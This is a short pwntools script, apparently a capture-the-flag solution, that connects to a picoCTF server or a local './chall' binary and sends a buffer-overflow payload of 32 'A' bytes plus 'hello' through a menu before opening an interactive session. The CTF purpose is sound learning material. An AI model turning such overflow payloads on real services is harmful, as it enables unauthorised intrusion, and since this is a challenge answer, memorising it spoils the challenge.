from pwn import *

context.terminal = ['tmux', 'splitw', '-v']

if args.REMOTE:
    host, port = 'tethys.picoctf.net', 52577
    p = remote(host, port)
else:
    p = process('./chall')

if args.GDB:
    gdb.attach(p, gdbscript='''
        b main
    ''')


p.sendlineafter(b'choice: ', b'2')
p.sendlineafter(b'buffer: ', b'A' * 32 + b'hello')
p.sendlineafter(b'choice: ', b'4')

p.interactive()